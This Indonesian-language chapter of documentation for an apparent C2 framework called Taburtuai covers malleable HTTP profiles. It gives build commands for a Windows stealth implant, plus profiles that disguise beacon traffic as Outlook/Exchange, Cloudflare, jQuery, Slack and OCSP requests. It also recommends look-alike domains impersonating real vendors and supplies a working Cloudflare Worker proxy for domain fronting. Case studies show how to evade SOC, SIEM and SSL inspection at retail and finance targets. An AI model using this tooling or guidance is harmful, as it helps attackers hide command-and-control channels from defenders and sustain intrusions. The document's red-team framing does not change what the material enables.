# 17 — Malleable HTTP Profiles

> Malleable C2 profiles mengubah "tampilan" lalu lintas jaringan antara agent dan server
> sehingga traffic C2 menyerupai aplikasi atau layanan yang sah dan tidak terlihat mencurigakan
> bagi IDS/IPS, SIEM, maupun analis SOC.

---

## Mengapa Ini Penting?

Setiap C2 yang berjalan dengan konfigurasi default meninggalkan **network signature** yang sangat khas:

```
POST /api/v1/checkin HTTP/1.1
Host: 185.220.xxx.xxx:8080
User-Agent: Go-http-client/1.1
Content-Type: application/json
```

Seorang analis SOC atau IDS rule langsung bisa mendeteksi:
- URI `/api/v1/checkin` — tidak ada aplikasi sah yang pakai path ini
- `User-Agent: Go-http-client` — bukan browser, tapi eksplisit Go binary
- IP asing tanpa domain, port non-standar
- Interval request yang konsisten (beacon pattern)

**Dengan malleable profiles**, traffic yang sama terlihat seperti:

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: mail-gateway.corp-redir.com:443
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
Content-Type: application/json
X-MS-Exchange-Organization-AuthSource: corp.local
X-AnchorMailbox: SystemMailbox{1f05a927}@corp.local
```

Analis melihat ini: *"Oh, Outlook lagi sync email ke Exchange. Normal."*

---

## Arsitektur Profile

### Komponen yang Diubah

| Komponen | Default | Contoh Office365 |
|---|---|---|
| Checkin URI | `/api/v1/checkin` | `/autodiscover/autodiscover.xml` |
| Command poll URI | `/api/v1/command/{id}/next` | `/ews/exchange.asmx/{id}` |
| Result submit URI | `/api/v1/command/result` | `/mapi/emsmdb` |
| User-Agent | Chrome 124 generic | Microsoft Outlook 16.0 |
| HTTP Headers (extra) | — | X-MS-Exchange-*, Prefer |
| Content-Type | application/json | application/json |

### Cara Kerja di Server

```
C2 SERVER
─────────────────────────────────────────────────────────────────

Selalu aktif (untuk operator CLI):
  POST /api/v1/checkin           → AgentCheckin handler
  GET  /api/v1/command/:id/next  → GetNextCommand handler
  POST /api/v1/command/result    → SubmitResult handler

Aktif tambahan saat --profile office365:
  POST /autodiscover/autodiscover.xml  → AgentCheckin handler
  GET  /ews/exchange.asmx/:id          → GetNextCommand handler
  POST /mapi/emsmdb                    → SubmitResult handler

Handler sama — hanya route alias yang berbeda.
```

---

## Semua Profile yang Tersedia

### `default` — Taburtuai Standard

Profile bawaan. Tidak ada masquerading. Cocok untuk lab atau jaringan internal
di mana network monitoring tidak ketat.

```
Checkin URI : /api/v1/checkin
Command URI : /api/v1/command/{id}/next
Result URI  : /api/v1/command/result
User-Agent  : Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0
Extra Headers: (none)
```

**Kapan pakai:** Lab testing, internal engagement, saat speed lebih penting dari stealth.

---

### `office365` — Microsoft Exchange / EWS

Menyamar sebagai Microsoft Outlook yang sync email ke Exchange Web Services.
Sangat efektif di environment korporat yang mengizinkan O365 traffic.

```
Checkin URI : /autodiscover/autodiscover.xml
Command URI : /ews/exchange.asmx/{id}
Result URI  : /mapi/emsmdb

Extra Headers:
  X-MS-Exchange-Organization-AuthSource: corp.local
  X-MS-Exchange-Forest-RulesExecuted: true
  X-AnchorMailbox: SystemMailbox{1f05a927-5cdd-4f0f-a8c2}@corp.local
  X-MS-Exchange-Organization-SCL: -1
  Prefer: exchange.behavior.version=2

User-Agents (rotasi random per request):
  Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
  Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17928; Pro)
  Autodiscover/1.0 (Microsoft Office/16.0 (Windows NT 10.0))
```

**Kapan pakai:**
- Target menggunakan Office 365 / Exchange
- Defender memantau outbound HTTP tapi izinkan Exchange traffic
- Engagement yang memerlukan traffic blend in dengan corporate email

**Interval realistis:** 300 detik (5 menit) — sama dengan Outlook sync default.

---

### `cdn` — Cloudflare CDN Edge

Menyamar sebagai request ke Cloudflare CDN edge network. Header CF-* adalah
header standar yang ditambahkan Cloudflare ke setiap request yang melewati CDN mereka.

```
Checkin URI : /cdn-cgi/rum
Command URI : /cdn-cgi/challenge-platform/h/b/flow/{id}
Result URI  : /cdn-cgi/zaraz/t

Extra Headers:
  CF-IPCountry: US
  CF-Visitor: {"scheme":"https"}
  X-Forwarded-For: 1.1.1.1
  CDN-Loop: cloudflare
  X-Forwarded-Proto: https

User-Agents (rotasi):
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/124.0
```

**Catatan:** `/cdn-cgi/rum` adalah endpoint Real User Monitoring Cloudflare yang
memang sering dipanggil browser secara otomatis. Sangat normal di jaringan yang
site-nya menggunakan Cloudflare.

**Interval realistis:** 120–300 detik.

---

### `jquery` — Static Asset / jQuery CDN

Menyamar sebagai request ke jQuery atau static asset JavaScript. Browser secara
rutin meminta file `.js` dari CDN, sehingga traffic ini sangat umum.

```
Checkin URI : /assets/js/jquery-3.7.1.min.js
Command URI : /assets/js/bundle.{id}.min.js
Result URI  : /assets/js/vendors~main.chunk.js

Content-Type: application/x-www-form-urlencoded

Extra Headers:
  Referer: https://code.jquery.com/
  X-Requested-With: XMLHttpRequest
  Origin: https://code.jquery.com

User-Agents: Chrome, Firefox, Safari (rotasi)
```

**Interval realistis:** 60–120 detik.

---

### `slack` — Slack Web API

Menyamar sebagai Slack desktop app yang melakukan API calls. Slack sangat
umum di workspace korporat modern.

```
Checkin URI : /api/users.identity
Command URI : /api/conversations.history/{id}
Result URI  : /api/chat.postMessage

Extra Headers:
  Authorization: Bearer xoxb-placeholder-token-for-profile
  X-Slack-Retry-Num: 0
  X-Slack-No-Retry: 1
  X-Slack-Request-Timestamp: <unix timestamp>

User-Agents:
  Slack SSB/4.35.126 (Win32 NT 10.0.22621; x64)
  Slack/4.35.126 (Windows 10; 64-bit; +https://slack.com)
```

**Interval realistis:** 30–60 detik — Slack polling interval normal.

---

### `ocsp` — Certificate Validation (Paling Stealth)

Menyamar sebagai validasi sertifikat TLS (OCSP — Online Certificate Status Protocol).
Ini adalah traffic yang **paling tidak mencolok** karena setiap Windows host melakukan
OCSP check secara otomatis saat membuka koneksi HTTPS.

```
Checkin URI : /ocsp
Command URI : /ocsp/{id}
Result URI  : /crl/root.crl

Content-Type: application/ocsp-request

Extra Headers:
  Cache-Control: no-cache
  Pragma: no-cache

User-Agents:
  Microsoft-CryptoAPI/10.0
  Microsoft-WinHTTP/5.1
  CertUtil URL Agent
```

**Kapan pakai:**
- Engagement dengan SOC yang sangat mature
- Environment dengan deep packet inspection
- Ingin traffic yang benar-benar blend in dengan OS behavior

`Microsoft-CryptoAPI` adalah user-agent yang dibuat Windows sendiri saat melakukan
certificate validation — tidak ada yang mencurigai Windows mengecek sertifikat TLS.

**Interval realistis:** 1800–3600 detik — OCSP check tidak perlu sering.

---

## Cara Penggunaan

### Step 1 — Build Agent dengan Profile

```bash
# Office365 profile
make agent-win-stealth \
  C2_SERVER=https://mail-gateway.corp-redir.com \
  ENC_KEY=EnterpriseC2Key2026 \
  PROFILE=office365 \
  INTERVAL=300 \
  JITTER=20 \
  KILL_DATE=2026-06-30
```

**Output:**
```
[*] Building Windows stealth agent...
    C2_SERVER : https://mail-gateway.corp-redir.com
    ENC_KEY   : EnterpriseC2Key2026
    PROFILE   : office365
    INTERVAL  : 300s  JITTER: 20%
    KILL_DATE : 2026-06-30
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)

[i] Profile: office365
    Checkin → POST /autodiscover/autodiscover.xml
    Poll    → GET  /ews/exchange.asmx/{id}
    Result  → POST /mapi/emsmdb
    UA pool : Outlook/Word/Autodiscover (rotasi random)
```

```bash
# CDN profile
make agent-win-stealth \
  C2_SERVER=https://cdn-assets.legit-cdn.com \
  ENC_KEY=EnterpriseC2Key2026 \
  PROFILE=cdn \
  INTERVAL=180 \
  JITTER=40
```

**Output:**
```
[*] Building Windows stealth agent...
    PROFILE   : cdn
    INTERVAL  : 180s  JITTER: 40%  (range: 108s–252s)
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)

[i] Profile: cdn
    Checkin → POST /cdn-cgi/rum
    Poll    → GET  /cdn-cgi/challenge-platform/h/b/flow/{id}
    Result  → POST /cdn-cgi/zaraz/t
    Headers : CF-IPCountry, CF-Visitor, CDN-Loop
```

```bash
# OCSP — paling stealth
make agent-win-stealth \
  C2_SERVER=https://ocsp.trusted-root-ca.com \
  ENC_KEY=APTSim2026Key \
  PROFILE=ocsp \
  INTERVAL=3600 \
  JITTER=60 \
  KILL_DATE=2026-12-31
```

**Output:**
```
[*] Building Windows stealth agent...
    PROFILE   : ocsp
    INTERVAL  : 3600s  JITTER: 60%  (range: 1440s–5760s)
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)

[i] Profile: ocsp
    Checkin → POST /ocsp
    Poll    → GET  /ocsp/{id}
    Result  → POST /crl/root.crl
    UA pool : Microsoft-CryptoAPI/10.0, Microsoft-WinHTTP/5.1
[i] NOTE: Interval sangat panjang (1-96 menit) — cocok untuk APT simulation.
```

**PENTING:** Profile yang di-build ke agent **harus sama** dengan profile yang
dijalankan di server. Mismatch = agent tidak bisa connect.

---

### Step 2 — Jalankan Server dengan Profile yang Sama

```bash
# Server harus pakai profile yang sama dengan agent
ENCRYPTION_KEY=EnterpriseC2Key2026 ./bin/server \
  --port 443 \
  --profile office365
```

**Output startup:**
```
[*] Taburtuai C2 Server starting...

    addr     0.0.0.0:443
    auth     false
    profile  office365
    logs     ./logs
    db       ./data/taburtuai.db

[*] Profile: office365 — registering route aliases...
    POST /autodiscover/autodiscover.xml  → agent checkin
    GET  /ews/exchange.asmx/:id          → command poll
    POST /mapi/emsmdb                    → result submit

[+] Server ready. Listening on :443
```

```bash
# Server dengan CDN profile
ENCRYPTION_KEY=EnterpriseC2Key2026 ./bin/server --port 443 --profile cdn
```

**Output:**
```
[*] Profile: cdn — registering route aliases...
    POST /cdn-cgi/rum                              → agent checkin
    GET  /cdn-cgi/challenge-platform/h/b/flow/:id → command poll
    POST /cdn-cgi/zaraz/t                          → result submit

[+] Server ready. Listening on :443
```

---

### Step 3 — Verifikasi Traffic

Setelah agent berjalan di target dan melakukan checkin:

```
taburtuai(mail-gateway.corp-redir.com:443) › agents list
```

```
[+] 1 agent(s) registered:

ID        HOSTNAME          USER           OS       STATUS   LAST SEEN
2703886d  CORP-LAPTOP-JD01  CORP\john.doe  Windows  online   3s ago
```

**Di log server** (bukan output console, tapi di `./logs/`):
```
2026-04-23T09:15:03Z  POST  /autodiscover/autodiscover.xml  200  [agent=2703886d]
2026-04-23T09:20:07Z  GET   /ews/exchange.asmx/2703886d     200  [no-cmd]
2026-04-23T09:25:09Z  GET   /ews/exchange.asmx/2703886d     200  [cmd=whoami]
2026-04-23T09:25:12Z  POST  /mapi/emsmdb                    200  [result=2703886d]
```

**Di Wireshark atau network capture target:**
```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: mail-gateway.corp-redir.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
Content-Type: application/json
X-MS-Exchange-Organization-AuthSource: corp.local
X-AnchorMailbox: SystemMailbox{1f05a927}@corp.local
Content-Length: 248
```

Analis SOC atau IDS melihat: "Outlook melakukan Exchange sync." ✓

---

### Referensi Cepat — Pasangan Profile

| PROFILE agent | Flag server | URI yang dipakai | Interval tipikal |
|---|---|---|---|
| `default` | `--profile default` (atau tanpa flag) | `/api/v1/*` | 30–60s |
| `office365` | `--profile office365` | `/autodiscover/...`, `/ews/...`, `/mapi/...` | 300s |
| `cdn` | `--profile cdn` | `/cdn-cgi/*` | 120–300s |
| `jquery` | `--profile jquery` | `/assets/js/*.min.js` | 60–120s |
| `slack` | `--profile slack` | `/api/users.identity`, `/api/conversations.*` | 30–60s |
| `ocsp` | `--profile ocsp` | `/ocsp`, `/crl/root.crl` | 1800–3600s |

---

## Domain Name Matters

Nama domain C2 harus konsisten dengan profile yang dipilih:

```
Profile         Contoh Domain yang Cocok
─────────────────────────────────────────────────────────────────
office365    →  mail-gateway.corp-redir.com
                autodiscover.company-o365.net
                exchange-relay.enterprise-mail.com

cdn          →  assets.cdn-delivery-network.com
                static.cloudflare-content.net
                edge-cache.content-accelerator.com

jquery       →  cdn.jquery-static-assets.com
                assets.js-delivery.net
                static.web-resources-cdn.com

slack        →  api.slack-workspace.net
                hooks.slack-integration.com
                edge.slack-api-relay.com

ocsp         →  ocsp.trusted-root-ca.com
                crl.certificate-authority.net
                ocsp.digicert-revocation.com
```

Domain yang mengandung kata kunci relevan (mail, exchange, cdn, ocsp, static)
membuat traffic lebih believable di log firewall dan proxy.

---

## Studi Kasus

### Studi Kasus 1: Bypass DLP / HTTPS Inspection — Retail Enterprise

**Situasi:**
- Target: perusahaan retail besar dengan SSL inspection (MITM proxy)
- SIEM alert untuk koneksi ke IP asing yang tidak dikenal
- Beacon pattern regular (setiap 60 detik) akan terdeteksi

**Setup — Profile `cdn` + Domain Fronting:**

```bash
# Build agent CDN profile — di belakang Cloudflare
make agent-win-stealth \
  C2_SERVER=https://legit-looking.com \
  ENC_KEY=R3t41l3ng2026! \
  PROFILE=cdn \
  INTERVAL=180 \
  JITTER=50
```

```
[*] Building Windows stealth agent...
    PROFILE   : cdn
    INTERVAL  : 180s  JITTER: 50%  (range: 90s–270s)
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
```

```bash
# Jalankan server
ENCRYPTION_KEY=R3t41l3ng2026! ./bin/server --port 443 --profile cdn
```

**Hasilnya:**
- Traffic ke Cloudflare IP — sudah pasti di whitelist
- Header CF-* membuat traffic terlihat seperti CDN telemetry
- Interval 3 menit dengan jitter 50% — tidak ada beacon pattern yang jelas
- Range waktu: 90–270 detik (sangat tidak predictable)

---

### Studi Kasus 2: Corporate Finance — Office365 Profile

**Situasi:**
- Target: perusahaan finance dengan Microsoft 365
- SOC memantau semua traffic keluar, alert untuk "unusual outbound HTTP"
- Exchange/Outlook traffic sudah pasti di-whitelist

**Setup:**

```bash
make agent-win-stealth \
  C2_SERVER=https://mail-gateway.corpname-redir.com \
  ENC_KEY=F1n4nc3R3dt3am! \
  PROFILE=office365 \
  INTERVAL=300 \
  JITTER=20 \
  KILL_DATE=2026-07-31
```

```
[i] Profile: office365
    Interval : 300s ± 20%  (range: 240s–360s)
    UA pool  : Outlook/Word/Autodiscover
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
```

**Di SIEM target (yang terlihat analis):**
```
[INFO] Outbound HTTPS: mail-gateway.corpname-redir.com:443
       User-Agent   : Microsoft Office/16.0 (Outlook)
       Frequency    : Periodic sync every ~5 min
       Classification: NORMAL — Exchange traffic
       Action       : Allow
```

---

### Studi Kasus 3: APT Simulation — OCSP Profile (Long Haul)

**Situasi:**
- Engagement APT simulation, 6+ bulan, target dengan SOC mature
- EDR, network monitoring, behavioral analysis, anomaly detection

**Setup:**

```bash
make agent-win-stealth \
  C2_SERVER=https://ocsp.trusted-root-ca.com \
  ENC_KEY=APTs1mul4t10n2026 \
  PROFILE=ocsp \
  INTERVAL=3600 \
  JITTER=60 \
  KILL_DATE=2026-12-31
```

```
[i] Profile: ocsp
    Interval : 3600s ± 60%  (range: 1440s–5760s = 24min–96min)
    UA pool  : Microsoft-CryptoAPI/10.0
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
```

**Di network log target (yang terlihat analis):**
```
[2026-05-15 09:23:41] HTTPS POST ocsp.trusted-root-ca.com/ocsp
                       UA: Microsoft-CryptoAPI/10.0 — Certificate validation
[2026-05-15 11:07:18] HTTPS POST ocsp.trusted-root-ca.com/ocsp
                       UA: Microsoft-CryptoAPI/10.0 — Certificate validation
```

Dua OCSP request dengan selisih ~1 jam 40 menit — sangat normal, tidak ada pola
mencurigakan. Windows memang melakukan OCSP check secara organik.

---

## Domain Fronting

Domain fronting adalah teknik lanjutan yang digabungkan dengan malleable profiles
untuk menyembunyikan identitas server C2 yang sebenarnya.

### Konsep

```
Tanpa domain fronting:
  [Agent] ──HTTPS──► [IP C2: 185.220.xxx.xxx:443]
                       TLS SNI: c2.yourdomain.com
                       ↑ Firewall bisa block IP dan domain ini

Dengan domain fronting via Cloudflare:
  [Agent] ──HTTPS──► [Cloudflare CDN: 104.21.xxx.xxx]
                       TLS SNI: taburtuai-worker.workers.dev   ← terlihat di network
                       HTTP Host: c2.yourdomain.com            ← di dalam TLS, tidak terlihat
                       Cloudflare forward ke backend C2
                       ↑ Firewall hanya lihat koneksi ke Cloudflare (trusted)
```

### Build Agent dengan Domain Fronting

```bash
# Tanpa domain fronting (koneksi langsung ke C2)
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=KEY \
  PROFILE=office365

# Dengan domain fronting via Cloudflare Workers
make agent-win-stealth \
  C2_SERVER=https://taburtuai-worker.mjopsec.workers.dev \
  ENC_KEY=KEY \
  PROFILE=office365 \
  FRONT_DOMAIN=c2.yourdomain.com
```

```
[*] Building Windows stealth agent...
    C2_SERVER    : https://taburtuai-worker.mjopsec.workers.dev
    FRONT_DOMAIN : c2.yourdomain.com  (domain fronting active)
    PROFILE      : office365
[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)

[i] Domain fronting enabled:
    Connection TLS to : taburtuai-worker.mjopsec.workers.dev (Cloudflare IP)
    HTTP Host header  : c2.yourdomain.com (inside TLS tunnel)
```

### Cloudflare Worker Setup

```javascript
// worker.js — deploy ke Cloudflare Workers sebagai reverse proxy
export default {
  async fetch(request) {
    const url = new URL(request.url);
    url.hostname = "c2.yourdomain.com";  // ganti ke C2 backend

    const modifiedRequest = new Request(url.toString(), {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });

    return fetch(modifiedRequest);
  },
};
```

```bash
# Deploy worker
wrangler deploy worker.js --name taburtuai-worker
```

```
✅  Successfully published your Worker
    https://taburtuai-worker.mjopsec.workers.dev
```

### Pilihan CDN untuk Domain Fronting

| Situasi | Profile | Front CDN |
|---|---|---|
| SOC basic, no DPI | `office365` | Tidak perlu |
| Firewall ketat, IP C2 di-block | `cdn` | Cloudflare Worker |
| SSL inspection aktif | `ocsp` | AWS CloudFront |
| Enterprise O365 + DPI | `office365` | Cloudflare Worker |
| APT simulation | `ocsp` | AWS CloudFront / Azure CDN |

---

## Tips Operasional

### Pilih Profile Berdasarkan Target Environment

```
Pertanyaan:                              Profile:
────────────────────────────────────────────────────────────────
Target pakai Office 365 / Exchange?   → office365
Target di-protect Cloudflare?         → cdn
Target environment developer/startup? → jquery atau slack
Target dengan SOC mature + DPI?       → ocsp
Lab / internal testing?               → default
Target strict egress + whitelist CDN? → cdn + domain fronting
Target APT simulation, long haul?     → ocsp + domain fronting
```

### Interval yang Realistis per Profile

| Profile | Interval Realistis | Jitter | Alasan |
|---|---|---|---|
| `office365` | 300s | 20% | Outlook sync default 5 menit |
| `cdn` | 120–300s | 40–50% | CDN analytics tidak terlalu frequent |
| `jquery` | 60–120s | 30% | Lazy loading JavaScript normal |
| `slack` | 30–60s | 20% | Slack polling / WebSocket check |
| `ocsp` | 1800–3600s | 50–60% | OCSP check sangat infrequent |

---

**Selanjutnya:** [18 — OPSEC Hardening](18-opsec-hardening.md) — enkripsi string compile-time,
garble obfuscation, dan Authenticode self-signing untuk implant yang lebih sulit dianalisis.
